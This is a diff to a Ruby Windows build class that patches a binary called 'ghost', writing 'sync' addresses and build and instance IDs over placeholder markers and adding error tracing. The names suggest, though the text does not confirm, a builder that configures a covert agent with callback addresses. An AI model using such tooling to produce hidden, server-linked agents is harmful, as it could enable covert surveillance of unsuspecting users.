@@ -211,12 +211,19 @@ class BuildWindows < Build
     # patching for the ghost
     patch_file(:file => 'ghost') do |content|
       begin
-        content.binary_patch 'ADDRESS1', params[:sync][0]
-        content.binary_patch 'ADDRESS2', params[:sync][1]
-        content.binary_patch "\xde\xad\xbe\xe1", [params[:build]].pack('I')
-        content.binary_patch "\xde\xad\xbe\xe2", [params[:instance]].pack('I')
-      rescue
-        raise "Ghost marker not found"
+        offset = content.index("ADDRESS1")
+        raise "address1 not found" if offset.nil?
+        content.binary_patch_at_offset offset, params[:sync][0]
+        offset = content.index("ADDRESS2")
+        raise "address2 not found" if offset.nil?
+        content.binary_patch_at_offset offset, params[:sync][1]
+
+        content.binary_patch "\xe1\xbe\xad\xde", [params[:build]].pack('I')
+        content.binary_patch "\xe2\xbe\xad\xde", [params[:instance]].pack('I')
+      rescue Exception => e
+        trace :error, e.message
+        trace :fatal, e.backtrace.join("\n")
+        raise "Ghost marker not found: #{e.message}"
       end
     end
   end
